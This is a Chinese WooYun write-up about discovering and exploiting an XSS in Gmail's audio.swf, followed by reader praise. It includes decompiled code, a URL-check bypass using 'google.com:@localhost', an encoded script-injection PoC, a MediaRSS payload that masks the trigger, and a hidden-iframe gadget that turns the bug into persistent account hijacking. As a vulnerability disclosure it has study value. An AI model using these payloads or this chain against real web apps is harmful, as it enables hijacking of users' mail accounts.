@@ -1,0 +1,278 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">一次SWF XSS挖掘和利用</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">p.z</a> <span class="bull">·</span> <time title="2012/12/28 18:43" ui-time="" datetime="2012/12/28 18:43" class="published ng-binding ng-isolate-scope">2012/12/28 18:43</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>[ 目录 ]</p><p>[0x00] 背景</p><p>[0x01] 挖掘漏洞</p><p>[0x02] 优雅利用</p><p>[0x03] 从反射到rootkit</p><p>[0x04] 总结</p><p>[0x00] 背景</p><p>这篇迟到了近一年的paper是对 <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-04841">WooYun: Gmail某处XSS可导致账号持久劫持</a> 漏洞的详细说明,赶在世界末日发布,希望不会太晚.:)</p><p>既然标题已经提到了SWF XSS,那么第一件事就是查找mail.google.com域下的所有swf文件.感谢万能的Google,利用下面的dork,可以搜索任意域的swf, "site:yourdomain.com filetype:swf",进行简单的去重之后,我们得到了如下几个swf文件:</p><pre><code>https://mail.google.com/mail/im/chatsound.swf
+https://mail.google.com/mail/uploader/uploaderapi2.swf
+https://mail.google.com/mail/html/audio.swf
+https://mail.google.com/mail/im/sound.swf
+https://mail.google.com/mail/im/media-api.swf
+</code></pre><p>通过文件名以及直接打开,对这些的swf的功能应该有了一个初步的判断. chatsound.swf和sound.swf应该是播放声音用的, uploaderapi2.swf是上传文件, audio.swf是播放音频文件, media-api.swf? 还是不知道干嘛用的... 然后直接在Google里搜索这些swf的地址, 可以得到一些含有swf的地址, 比如"https://mail.google.com/mail/html/audio.swf?audioUrl= Example MP3 file", 通过这些swf后面跟的参数, 我们可以进一步推测出这个swf的功能, 此外在反编译时搜索这些参数, 可以快速地定位到整个swf的初始化的过程. 通过以上的过程, 我们发现, 该swf不仅仅接受audioUrl参数, 还接受videoUrl参数, 说明它还是一个视频播放器, 功能上的复杂化必然会对应用的安全性有所影响, 我们决定对此SWF文件进行深入分析.</p><p>[0x01] 挖掘漏洞</p><p>下载反编译后得到该swf所有的as文件, 通过搜索'ExternalInterface.call', 'getURL', 'navigateToURL', 'javascript:'等关键函数和字符串, 可以快速地定位一些能够执行javascript的代码段. 当搜索'javascript:'时, 我们得到了如下有意思的代码:</p><pre><code>==com.google.video.apps.VideoPlayback==
+    _loc1.onPlaybackComplete = function ()
+    {
+        if (this.playerMode_ == com.google.ui.media.MediaPlayer.PLAYER_MODE_NORMAL || this.playerMode_ == com.google.ui.media.MediaPlayer.PLAYER_MODE_MINI)
+        {
+            this.queueURL("javascript:FlashRequest(\'donePlaying\', \'\"" + this.mediaPlayer_.url + "\"\');");
+        } // end if
+        ...
+</code></pre><p>一个类似javascript伪协议的字符串被代入了queueURL函数, 而且最为关键的是this.mediaPlayer&#95;.url是被直接拼接到字符串的, 并未加以对引号的转义. 但说这是一个xss漏洞还为时过早, 因为我们不知道queueURL函数到底是做什么的, 而且对于this.mediaPlayer&#95;.url在赋值之前是否有进行过滤, 还是处于一个未知的状态. 此外通过对函数名的判断,onPlaybackComplete应该是一个在播放完毕之后的回调函数.</p><p>我们搜索到了函数queueURL被定义的地方, 代码如下:</p><pre><code>==com.google.video.apps.VideoPlayback==
+    _loc1.queueURL = function (url)
+    {
+        if (this.urlQueue_ == undefined)
+        {
+            this.urlQueue_ = new Array();
+        } // end if
+        this.urlQueue_.push(url);
+    };
+    ...
+</code></pre><p>然后通过跟踪"urlQueue_"变量, 发现如下代码:</p><pre><code>==com.google.video.apps.VideoPlayback==
+    _loc1.checkForPageChanges = function ()
+    {
+        ...
+        if (this.urlQueue_ != undefined)
+        {
+            var _loc2 = this.urlQueue_.shift();
+            if (_loc2 != undefined)
+            {
+                getURL(_loc2, "_self");
+            } // end if
+        }
+        ...
+</code></pre><p>继续跟踪"checkForPageChanges"函数:</p><pre><code>==com.google.video.apps.VideoPlayback==
+    _loc1.initPlayerWithVars = function ()
+    {
+        ...
+        _global.setInterval(this, "checkForPageChanges", 100);
+        ...
+</code></pre><p>搜索"initPlayerWithVars"函数:</p><pre><code>==com.google.video.apps.VideoPlayback==
+    _loc1.initializePlayer = function ()
+    {
+        ...
+        if (this.mediaState_ != undefined &amp;&amp; (this.mediaState_.videoUrl != undefined || this.mediaState_.audioUrl != undefined))
+        {
+            this.initPlayerWithVars();
+        } // end if
+</code></pre><p>从函数名字initializePlayer推断, 这个应该是一个初始化播放器的函数, 在swf打开的时候应该会被执行. 通过搜索的结果, 对整个过程进行反演:initializePlayer函数初始化播放器, 通过对(this.mediaState_ != undefined &amp;&amp; (this.mediaState&#95;.videoUrl != undefined || this.mediaState&#95;.audioUrl != undefined))这一逻辑的判读, 如果为true, 则执行initPlayerWithVars函数, 每隔100毫秒调用checkForPageChanges函数, checkForPageChanges函数会检查urlQueue&#95;是否为空数组, 如果不为空, 则弹出数组成员, 直接传入getURL函数. 而onPlaybackComplete则是一回调函数, 当播放完成后自动调用, 如果满足逻辑(this.playerMode&#95; == com.google.ui.media.MediaPlayer.PLAYER&#95;MODE&#95;NORMAL || this.playerMode_ == com.google.ui.media.MediaPlayer.PLAYER&#95;MODE&#95;MINI), 会把this.mediaPlayer&#95;.url参数压入urlQueue&#95;数组.</p><p>通过以上跟踪分析, 我想我们可以得到第一个疑问的答案了,this.mediaPlayer&#95;.url参数最终会被传入到getURL函数. 现在要来看mediaPlayer&#95;.url参数是怎么取到的.</p><p>搜索mediaPlayer_.url:</p><pre><code>==com.google.video.apps.VideoPlayback==
+    _loc1.initPlayerWithVars = function ()
+    {
+        this.videoStats_.endPlayback();
+        if (this.mediaState_.videoUrl != undefined)
+        {
+            this.mediaPlayer_.mediaType = com.google.ui.media.MediaPlayer.MEDIA_VIDEO;
+            this.setVideoUrl(this.mediaState_.videoUrl);
+        }
+        else if (this.mediaState_.audioUrl != undefined)
+        {
+            this.mediaPlayer_.mediaType = com.google.ui.media.MediaPlayer.MEDIA_AUDIO;
+            this.mediaPlayer_.url = this.mediaState_.audioUrl;
+
+            ...
+
+    _loc1.setVideoUrl = function (url)
+    {
+        this.mediaPlayer_.url = url;
+        ...
+    };
+</code></pre><p>通过上述代码可以发现mediaPlayer&#95;.url可以从两个地方获取, mediaState&#95;.videoUrl和mediaState&#95;.audioUrl. 现在再回过头来看文章开头的地方提到两个参数, videoUrl和audioUrl, 我们推断mediaState&#95;.videoUrl和mediaState&#95;.audioUrl参数是从url中传入的. 为了验证这一的想法, 我把audio.swf放置在本地服务器上, 并自己写了一个swf去读取audio.swf中的mediaState&#95;.videoUrl和mediaState&#95;.audioUrl. 当我载入http://localhost/gmail/audio.swf?videoUrl=http://localhost/test.flv时, 发现读取到的mediaState&#95;.videoUrl为空.看来事情并没有我们想象的那么简单.</p><p>我们继续来跟代码. mediaState&#95;应该是一个类的实例, 通过实例的名字, 我们猜测类名可能是mediaState, 搜索mediaState, 果然存在这个类:com.google.video.apps.MediaState. 阅读代码, 我们发现了读取mediaState&#95;.videoUrl值失败的关键逻辑</p><pre><code>==com.google.video.apps.MediaState==
+    _loc1.fromArgs = function (mainClip, playPageBase)
+    {
+        ...
+        if (mainClip.videoUrl == undefined &amp;&amp; mainClip.videourl != undefined)
+        {
+            mainClip.videoUrl = mainClip.videourl;
+        } // end if
+        ...
+        if (com.google.webutil.url.Utils.isValidVideoUrl(mainClip.videoUrl))
+        {
+            this.videoUrl = mainClip.videoUrl;
+        }
+        if (com.google.webutil.url.Utils.isValidAbsoluteGoogleUrl(mainClip.audioUrl))
+        {
+            this.audioUrl = mainClip.audioUrl;
+        }
+</code></pre><p>看来swf对从url传入的值进行了检查. 我们接着跟踪com.google.webutil.url.Utils.isValidVideoUrl和com.google.webutil.url.Utils.isValidAbsoluteGoogleUrl这两个函数.</p><pre><code>==com.google.webutil.url.Utils==
+    _loc1.isValidVideoUrl = function (videoUrl)
+    {
+        if (com.google.webutil.url.Utils.isPrefix(videoUrl, "http://youtube.com/watch?v="))
+        {
+            return (true);
+        } // end if
+        var _loc3 = "http://vp";
+        if (!com.google.webutil.url.Utils.isPrefix(videoUrl, _loc3))
+        {
+            return (false);
+        } // end if
+        var _loc4 = videoUrl.indexOf(".", _loc3.length);
+        if (_loc4 != _loc3.length &amp;&amp; _global.isNaN(_global.parseInt(videoUrl.slice(_loc3.length, _loc4))))
+        {
+            return (false);
+        } // end if
+        return (com.google.webutil.url.Utils.isPrefix(videoUrl.substr(_loc4), ".video.google.com/videodownload"));
+    };
+
+    _loc1.isValidAbsoluteGoogleUrl = function (url)
+    {
+        if (com.google.webutil.url.Utils.isValidAbsoluteUrl(url))
+        {
+            var _loc3 = "google.com";
+            var _loc4 = com.google.webutil.url.Utils.getProtocolAndHost(url);
+            var _loc5 = _loc4.substring(_loc4.length - _loc3.length);
+            return (_loc5 == _loc3);
+        } // end if
+        return (false);
+    };
+</code></pre><p>现在回想一下我们利用成功的前提条件, 就是需要函数没有在对mediaState&#95;.videoUrl或mediaState&#95;.audioUrl赋值时进行引号的转义. 阅读以上的代码, 我们发现验证函数并没有任何对引号进行转义操作, 说明这个漏洞的确是存在的.:) 但是别高兴地太早了, 在回过头想一下触发getURL的函数onPlaybackComplete, 没错, 是一个回调函数, 需要视频流或者音频流播放完毕, 因此, 我们必须要寻找一个确实存在的视频或者音频文件, 且能满足以上对于url的检查. 由于audio.swf文件创建时间比较早, isValidVideoUrl函数中检验的几个api均已经废弃了, 因此我们转向检查较为宽松的isValidAbsoluteGoogleUrl的函数以寻求突破.</p><p>我们来看下com.google.webutil.url.Utils.getProtocolAndHost这个关键函数.</p><pre><code>==com.google.webutil.url.Utils==
+    _loc1.getProtocolAndHost = function (url)
+        {
+            var _loc3 = com.google.webutil.url.Utils.getProtocolHostAndPort(url);
+            var _loc4 = _loc3.indexOf("://");
+            var _loc5 = _loc3.lastIndexOf(":");
+            if (_loc5 &lt; 0 || _loc4 == _loc5)
+            {
+                return (_loc3);
+            }
+            else
+            {
+                return (_loc3.substring(0, _loc5));
+            } // end else if
+        };
+    ...
+    _loc1.getProtocolHostAndPort = function (url)
+    {
+        var _loc3 = url.indexOf("://");
+        if (_loc3 == -1)
+        {
+            _loc3 = 0;
+        }
+        else
+        {
+            _loc3 = _loc3 + 3;
+        } // end else if
+        var _loc4 = com.google.webutil.url.Utils.indexOfOrMax(url, "/", _loc3);
+        var _loc5 = com.google.webutil.url.Utils.indexOfOrMax(url, "?", _loc3);
+        var _loc6 = Math.min(_loc4, _loc5);
+        return (url.substring(0, _loc6));
+    };
+</code></pre><p>注意getProtocolAndHost函数中var <em>loc5 = _loc3.lastIndexOf(":")这行代码, 我想程序员的本意是想利用这个":"获取web应用的端口, 如localhost:8080之类的, 但是在uri中,还有一个地方是需要":"的, 就是在401登陆中, 作为用户名和密码的分割符, 而且这个":"出现的位置是在作为分割host和端口的":"之前. 利用这个特性,我们就可以很轻松地绕过isValidAbsoluteGoogleUrl的检查了. 载入http://localhost/gmail/audio.swf?audioUrl=http://google.com:@localhost/t.mp3时, 成功地读取到的mediaState</em>.audioUrl的值,就是http://google.com:@localhost/t.mp3.</p><p>再加上其他参数,使得能满足上述的一些if判断,最后的poc如下:</p><pre><code>https://mail.google.com/mail/html/audio.swf?playerMode=normal&amp;autoplay=true&amp;audioUrl=http://google.com:@localhost/gmail/t.mp3?%27%29%3Bfunction%20FlashRequest%28%29%7Balert%28document.domain%29%7D%2f%2f
+</code></pre><p>URL解码后如下</p><pre><code>https://mail.google.com/mail/html/audio.swf?playerMode=normal&amp;autoplay=true&amp;audioUrl=http://google.com:@localhost/gmail/t.mp3?');function FlashRequest(){alert(document.domain)}//
+</code></pre><p>我们拼接最后传入getURL的伪协议字符串</p><pre><code>javascript:FlashRequest('donePlaying', 'http://google.com:@localhost/gmail/t.mp3?');function FlashRequest(){alert(document.domain)}//');
+</code></pre><p>由于在承载swf的html页面中FlashRequest未定义, 我们需要自己定义一个FlashRequest函数, 而且在js中, function语句是最先执行的, 所以不用担心在执行FlashRequest('donePlaying', 'http://google.com:@localhost/gmail/t.mp3?')这句时FlashRequest还没有定义. 当然, 你可以把alert(document.domain)转换成任意你想要执行的js代码. 另外值得注意的一点就是, 由于getURL操作在mp3播放完毕后才触发的, 因此我们把http://localhost/t.mp3剪切得足够短, 只有0.5秒, 当你打开swf之后, 不到一秒钟, MP3已经载入并播放完毕, js得到了执行, 你很难察觉到其中的延迟.</p><p>[0x02] 优雅利用</p><p>对于一个完美主义者, 我们不得不承认, 上述提到的poc是丑陋的. 原因如下:</p><pre><code>1. 我们的URL中含有大量的脏代码, 这仅仅是一个poc, 如果需要更进一步的操作, 我们还要添加大量字符到url.
+2. 像"http://google.com:@localhost/t.mp3"这样的URL只能被Firefox认可, Chrome和IE会废弃这类的请求.
+3. 如果我们需要真正地做一些dirty work, 而不仅仅是弹个document.domain的窗, 那么我们可能需要进行一些的网络通信, 比如载入js,获取关键数据等, 而这些操作的代价是什么, 没错, 就是时间. 我们的poc仅仅是播放一个0.5秒长的MP3文件, 对于一个无聊的dead page, 人们的反应通常右上角的X. 换句话说, 我们争取不到我们需要的时间.
+</code></pre><p>那么如何形成一个更加优雅的利用方式呢?</p><p>我在查找fromArgs函数时, 发现以下的代码</p><pre><code>==com.google.video.apps.VideoPlayback==
+    if (com.google.webutil.url.Utils.isValidAbsoluteUrl(this.clip_.videoUrl) || com.google.webutil.url.Utils.isValidAbsoluteUrl(this.clip_.audioUrl))
+    {
+        this.mediaState_ = new com.google.video.apps.MediaState();
+        this.mediaState_.fromArgs(this.clip_, this.vgcHostPort + com.google.video.apps.VideoPlayback.VGC_PLAYPAGE_PATH);
+    }
+    else if (com.google.webutil.url.Utils.isValidAbsoluteUrl(this.clip_.mediarss))
+    {
+        this.mediaRss_ = new com.google.xml.MediaRSS();
+        this.mediaRss_.init(this.clip_.mediarss);
+    }
+</code></pre><p>我想大概有两个办法可以载入一段视频, 一个是直接赋值一个videoUrl, 正如前文提到的, 另一个就是通过制定一个mediarss, swf去解析这个rss, 播放其中指定的视频, 更美妙的是, 对于mediarss, 只判断是是否是绝对地址(isValidAbsoluteUrl), 这使得载入我们直接服务器上的mediarss文件成为了可能.</p><p>让我们忘记所有的代码吧, 对于这种xml文件类的调试, 我想以黑盒的方式更加方便一些. 再感谢万能的Google, 我从网上找到了一份mediarss的样本, 修改如下, 我们替换了<media:group>中的<media:content>, 改成自己服务器上的flv文件地址. 上传到http://localhost/gmail/media.xml.</media:content></media:group></p><pre><code>&lt;rss version="2.0"&gt;
+        &lt;channel&gt;
+            &lt;title&gt;Google Video - Google Video top100 new&lt;/title&gt;
+            &lt;link&gt;http://video.google.com&lt;/link&gt;
+            &lt;description&gt;Google Video's top new videos.&lt;/description&gt;
+            &lt;generator&gt;Google Video&lt;/generator&gt;
+            &lt;image&gt;
+                &lt;title&gt;Google Video top100 new&lt;/title&gt;
+                &lt;link&gt;http://video.google.com&lt;/link&gt;
+                &lt;url&gt;http://video.google.com/common/google_logo_small.jpg&lt;/url&gt;
+                &lt;width&gt;100&lt;/width&gt;
+                &lt;height&gt;37&lt;/height&gt;
+            &lt;/image&gt;
+            &lt;item&gt;
+                &lt;title&gt;rubia&lt;/title&gt;
+                &lt;link&gt;http://video.google.com/videoplay?docid=-3406925506469882756&amp;sourceid=top100newfeed&lt;/link&gt;
+                &lt;guid&gt;http://video.google.com/videoplay?docid=-3406925506469882756&lt;/guid&gt;;
+                &lt;pubDate&gt;Sun, 21 May 2006 17:00:00 PDT&lt;/pubDate&gt;
+                &lt;description/&gt;
+                &lt;author&gt;individual&lt;/author&gt;
+                &lt;media:group&gt;
+                    &lt;media:content url="http://localhost/gmail/1.flv" type="video/x-flv" medium="video" expression="full" duration="68" width="320" height="240"/&gt;
+                &lt;/media:group&gt;
+            &lt;/item&gt;
+        &lt;/channel&gt;
+    &lt;/rss&gt;
+</code></pre><p>现在打开https://mail.google.com/mail/html/audio.swf?playerMode=normal&amp;mediarss=http://localhost/gmail/media.xml&amp;autoplay=true 我们惊喜地发现1.flv被成功地载入了, 看来swf对于从mediarss中传入的videoUrl, 并没有类似对url中传入videoUrl值的一个有效性验证, 短板理论在这里发挥了作用:)</p><p>为了更加完美地利用, 我们继续对media.xml进行一些小小的修改.</p><pre><code>&lt;rss version="2.0"&gt;
+        &lt;channel&gt;
+            &lt;title&gt;Google Video - Google Video top100 new&lt;/title&gt;
+            &lt;link&gt;http://video.google.com&lt;/link&gt;
+            &lt;description&gt;Google Video's top new videos.&lt;/description&gt;
+            &lt;generator&gt;Google Video&lt;/generator&gt;
+            &lt;image&gt;
+                &lt;title&gt;Google Video top100 new&lt;/title&gt;
+                &lt;link&gt;http://video.google.com&lt;/link&gt;
+                &lt;url&gt;http://video.google.com/common/google_logo_small.jpg&lt;/url&gt;
+                &lt;width&gt;100&lt;/width&gt;
+                &lt;height&gt;37&lt;/height&gt;
+            &lt;/image&gt;
+            &lt;item&gt;
+                &lt;title&gt;rubia&lt;/title&gt;
+                &lt;link&gt;http://video.google.com/videoplay?docid=-3406925506469882756&amp;sourceid=top100newfeed&lt;/link&gt;
+                &lt;guid&gt;http://video.google.com/videoplay?docid=-3406925506469882756&lt;/guid&gt;;
+                &lt;pubDate&gt;Sun, 21 May 2006 17:00:00 PDT&lt;/pubDate&gt;
+                &lt;description/&gt;
+                &lt;author&gt;individual&lt;/author&gt;
+                &lt;media:group&gt;
+                    &lt;media:content url="http://localhost/gmail/1.flv?');function FlashRequest(){alert(document.domain)}//" type="video/x-flv" medium="video" expression="full" duration="68" width="320" height="240"/&gt;
+                &lt;/media:group&gt;
+            &lt;/item&gt;
+            &lt;item&gt;
+                &lt;title&gt;rubia&lt;/title&gt;
+                &lt;link&gt;http://video.google.com/videoplay?docid=-3406925506469882756&amp;sourceid=top100newfeed&lt;/link&gt;
+                &lt;guid&gt;http://video.google.com/videoplay?docid=-3406925506469882756&lt;/guid&gt;;
+                &lt;pubDate&gt;Sun, 21 May 2006 17:00:00 PDT&lt;/pubDate&gt;
+                &lt;description/&gt;
+                &lt;author&gt;individual&lt;/author&gt;
+                &lt;media:group&gt;
+                    &lt;media:content url="http://localhost/gmail/2.flv" type="video/x-flv" medium="video" expression="full" duration="68" width="320" height="240"/&gt;
+                &lt;/media:group&gt;
+            &lt;/item&gt;
+        &lt;/channel&gt;
+    &lt;/rss&gt;
+</code></pre><p>其中1.flv是一段黑色背景, 无任何内容, 长0.5秒的视频, 播放1.flv结束后, 触发了事件, 通过getURL执行了js脚本, 与此同时,swf开始播放2.flv, 这是一段真正的有内容的视频, 他可以为我们争取到足够的时间进行一些dirty work了. 那么对于点开视频的人来说, 这段时间内究竟发生了什么呢, 他只是照常点了一个连接,发现是一段有意思的小视频, 可能这段视频前面有0.5秒的停滞,但又有谁会注意到呢?</p><p>[0x03] 从反射到rootkit</p><p>现在我们有一个利用十分优雅的xss了, 哦, 对不起, 但是这只是一个反射型xss, 用处似乎不大? 我们能不能把这个反射型xss转化成一个存储型的呢, 甚至更进一步, 变成一个rootkit, 一个xss shell, 使得用户在每一次打开gmail时都可中枪, 执行我们的js.</p><p>-什么?不可能?</p><p>-风太大,听不见. - .-</p><p>下面就看这个神奇的show吧. Gmail里面有个lab, 提供一些新奇的实验性的小玩意, 其中有一个就是"Add any gadget by URL". 你可以指定一个特定的gadget网址, 这个gadget会出现在你gmail页面的左下角. 用户可以往gadget里添加任意的html代码, 包括script, Google通过把这个gadget的域名设定为googleusercontent.com, 然后以iframe的方式载入, 来避免可能产生的安全问题. 但这个是否足够安全呢, 在大多数情况下, 是的. 可我们现在有了一个反射型xss, 这个答案就不一样了.</p><p>我根据digg.com的gadget做了一些修改, iframe了一个我们刚刚挖掘的gmail反射型xss.</p><pre><code>&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;Module&gt;
+        &lt;ModulePrefs title=" " directory_title="Digg 2.0" title_url="http://digg.com/"
+            description="Discover the best news, images and videos as voted on by the Digg community, from the social news website Digg.com. You can now customize your Digg gadget by topic, and view more story information, such as comments and a friend's activity feed.  Let us know what you think at <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4e282b2b2a2c2f2d25602a2729290e2a272929602d2123">[email&#160;protected]</a>"
+            screenshot="http://cdn1.diggstatic.com/img/gadget/ig.a39bd77c.png"
+            thumbnail="http://cdn3.diggstatic.com/img/gadget/ig-thumb.0281a8d3.png"
+            author="Digg.com Inc." author_location="San Francisco, CA"
+            author_email="<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1c7a7979787e7d7f773278757b7b5c78757b7b327f7371">[email&#160;protected]</a>" author_affiliation="digg.com Inc."
+            category="news" category2="technology"&gt;
+            &lt;Require feature="dynamic-height" /&gt;
+            &lt;Require feature="tabs" /&gt;
+            &lt;Require feature="setprefs" /&gt;
+        &lt;/ModulePrefs&gt;
+
+        &lt;UserPref name="user" datatype="hidden" /&gt;
+        &lt;UserPref name="thumbnail" datatype="hidden" default_value="1" /&gt;
+        &lt;UserPref name="filter" datatype="hidden" default_value="0" /&gt;
+        &lt;UserPref name="num" datatype="hidden" default_value="5" /&gt;
+        &lt;UserPref name="type" datatype="hidden" default_value="popular" /&gt;
+        &lt;UserPref name="refresh" datatype="hidden" default_value="0" /&gt;
+        &lt;UserPref name="tab" datatype="hidden" default_value="0" /&gt;
+        &lt;UserPref name="offset" datatype="hidden" default_value="0" /&gt;
+        &lt;UserPref name="pagination" datatype="hidden" default_value="0" /&gt;
+        &lt;UserPref name="business" datatype="hidden" default_value="true" /&gt;
+        &lt;UserPref name="entertainment" datatype="hidden" default_value="true" /&gt;
+        &lt;UserPref name="gaming" datatype="hidden" default_value="true" /&gt;
+        &lt;UserPref name="lifestyle" datatype="hidden" default_value="true" /&gt;
+        &lt;UserPref name="offbeat" datatype="hidden" default_value="true" /&gt;
+        &lt;UserPref name="politics" datatype="hidden" default_value="true" /&gt;
+        &lt;UserPref name="science" datatype="hidden" default_value="true" /&gt;
+        &lt;UserPref name="sports" datatype="hidden" default_value="true" /&gt;
+        &lt;UserPref name="technology" datatype="hidden" default_value="true" /&gt;
+        &lt;UserPref name="world_news" datatype="hidden" default_value="true" /&gt;
+
+
+        &lt;Content type="html"&gt;
+        &lt;![CDATA[
+        &lt;iframe width='0'style='visibility:hidden;' height='0' src="https://mail.google.com/mail/html/audio.swf?playerMode=normal&amp;mediarss=http://localhost/gmail/2.xml&amp;autoplay=true"&gt;&lt;/iframe&gt;
+        ]]&gt;
+
+        &lt;/Content&gt;
+    &lt;/Module&gt;
+</code></pre><p>整个攻击流程如下:</p><pre><code>[1] 黑客诱使受害者点击一个连接.Hacker sends a mail to the victim with a link.
+[2] 用户点击连接后,访问了我们的反射型xss,精心构造的js被执行.Victim receives the mail and unfortunately, clicks the link whick lead to our reflected xss swf metion above.
+[3] JS脚本探测用户是否开启了"Add any gadget by URL"功能,如果没有,用Ajax方式异步开启.
+[4] 添加一个gadget,gadget地址为我们服务器上的一个xml文件
+[5] 每当用户登录Gmail,左下角会载入gadget,gadget会iframe一个mail.google.com域的xss.通过引用top窗口句柄,黑客可以控制用户gmail中的任意内容.
+</code></pre><p>整个过程视频如下 <a href="http://v.youku.com/v_show/id_XMzU3MjQ1NTQw.html">http://v.youku.com/v&#95;show/id&#95;XMzU3MjQ1NTQw.html</a>.</p><p>[0x04] 总结</p><p>挖掘swf的漏洞并没有很难, 因为引起xss的函数最终也就这么几个, 你可以先搜索这几个关键函数, 再逆向跟踪引用它的函数, 譬如本文, 或者也可以先跟踪所有被传入swf的变量, 在跟踪这些变量的时候查看是否存在有漏洞的输出. 相比于审核JS文件中的dom输出, swf里的审核里显得方便了许多, 而且google的swf并没有类似google的js的混淆压缩, 代码更加友好. 但从调试工具上来说, swf就比JS薄弱了许多, 因此对于审核swf文件来说, 足够的耐心就显得比较重要了, 本文在第一步挖掘中跟踪了五级函数, 但实际上并没有描述那么简单, 因为每个函数基本上都会有几十次的调用, 你需要耐心地去分析每一次的调用, 找出所有可能存在漏洞的地方, 然后一级一级的向上跟踪.</p><p>而对于xss的利用, 你只需要发挥你的想象力.</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">国光</span> <span class="reply-time">2016-05-08 16:20:57</span></div><p></p><p>给跪了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hei_yu_fa</span> <span class="reply-time">2016-03-31 13:00:14</span></div><p></p><p>我要把乌云从头到尾翻个遍，你这篇有点叼啊...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">进击的小白</span> <span class="reply-time">2016-01-21 22:08:47</span></div><p></p><p>大神</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">枯荣</span> <span class="reply-time">2015-08-05 17:05:23</span></div><p></p><p>其实不敢留名 因为有些没懂</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ckaexn</span> <span class="reply-time">2015-08-05 12:32:04</span></div><p></p><p>跟大神学习</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">胡小树</span> <span class="reply-time">2015-02-04 23:51:30</span></div><p></p><p>多年以后，再看大神的漏洞还是很经典</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">RickGray</span> <span class="reply-time">2014-07-10 23:44:29</span></div><p></p><p>又看了一次，还是很经典</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">triangle</span> <span class="reply-time">2014-06-24 11:28:42</span></div><p></p><p>不错，mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">juuxdd</span> <span class="reply-time">2014-06-20 08:32:04</span></div><p></p><p>同求！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">juuxdd</span> <span class="reply-time">2014-06-20 08:31:23</span></div><p></p><p>谢谢</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-04-28 14:44:28</span></div><p></p><p>mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-03-26 12:45:05</span></div><p></p><p>学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">erevus</span> <span class="reply-time">2013-06-03 22:57:31</span></div><p></p><p>我看到了好多美刀 美刀啊啊啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">MEng</span> <span class="reply-time">2013-05-31 10:59:47</span></div><p></p><p>先收藏了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">clozure</span> <span class="reply-time">2013-01-15 00:09:04</span></div><p></p><p>碉堡，学习</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">1ee</span> <span class="reply-time">2013-01-07 17:42:48</span></div><p></p><p>必须收藏！！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">rootkit</span> <span class="reply-time">2013-01-07 11:39:48</span></div><p></p><p>学习了！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">紫梦芊</span> <span class="reply-time">2013-01-06 23:15:21</span></div><p></p><p>分析相当到位啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">p.z</span> <span class="reply-time">2013-01-06 20:01:44</span></div><p></p><p>audio.swf文件地址：http://swfpoc.appspot.com/vul/audio.swf</p><p></p></div></div><div 